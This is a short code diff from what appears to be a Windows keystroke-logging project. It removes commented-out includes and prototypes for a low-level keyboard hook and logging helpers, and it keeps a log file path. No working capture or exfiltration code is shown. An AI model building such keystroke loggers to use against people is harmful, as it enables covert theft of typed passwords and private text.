@@ -1,17 +1,5 @@
-//#include <windows.h>
-//#include <stdio.h>
-//#include <stdlib.h>
-//#include <string.h>
-//#include <ctype.h>
-//#include <time.h>
-
 #include "keys_handler.h"
 #define PATH "test-log.txt" // The path to the log file
-
-
-//LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
-//void log(char *str);
-//char *translate(int vk, int up);
 
 FILE *fd;
 
